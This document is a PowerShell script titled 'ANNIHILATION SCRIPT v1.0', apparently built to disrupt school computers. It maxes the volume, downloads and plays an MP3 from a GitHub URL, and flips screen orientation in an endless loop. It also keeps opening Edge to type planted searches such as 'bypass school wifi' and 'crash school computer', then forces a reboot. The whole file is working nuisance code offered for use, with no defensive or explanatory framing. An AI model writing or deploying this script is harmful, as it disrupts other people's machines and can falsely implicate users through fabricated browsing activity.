# —————————————————————————————
#     ANNIHILATION SCRIPT v1.0
# —————————————————————————————

# 1) Load the assemblies we need
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Media
Add-Type -AssemblyName System.Drawing

# 2) Instantly crank volume to max
$wshell = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 50; $i++) {
    $wshell.SendKeys([char]175)  # VK_VOLUME_UP
    Start-Sleep -Milliseconds 10
}

# 3) Download & play your payload MP3
$mp3Path = Join-Path $env:TEMP 'payload.mp3'
Invoke-WebRequest -Uri 'https://github.com/Anarxyfr/fdsa/raw/refs/heads/main/4b96811d-1725-4694-bf60-c3f3e54b5f94.mp3' `
    -OutFile $mp3Path
$player = New-Object System.Media.SoundPlayer $mp3Path
$player.Play()

# 4) Job #1: infinite orientation flipping
Start-Job -Name FlipOrientation -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    $keys = @('^{%}{LEFT}','^{%}{RIGHT}','^{%}{UP}','^{%}{DOWN}')
    while ($true) {
        [System.Windows.Forms.SendKeys]::SendWait( $keys | Get-Random )
        Start-Sleep -Seconds 3
    }
}

# 5) Job #2: infinite Edge search spam at ~200 WPM
Start-Job -Name EdgeSpam -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    $searches = @(
        'chromebook annihilation',
        'how to cheat on tests',
        'how to play games in school',
        'bypass school wifi',
        'install games without admin',
        'crash school computer'
    )
    while ($true) {
        $query = $searches | Get-Random
        Start-Process 'msedge.exe'
        Start-Sleep -Seconds 2

        foreach ($c in $query.ToCharArray()) {
            [System.Windows.Forms.SendKeys]::SendWait($c)
            Start-Sleep -Milliseconds 30
        }
        [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
        Start-Sleep -Seconds 3
    }
}

# 6) After 60 seconds, reboot for “convenience”
Start-Sleep -Seconds 60
Restart-Computer -Force
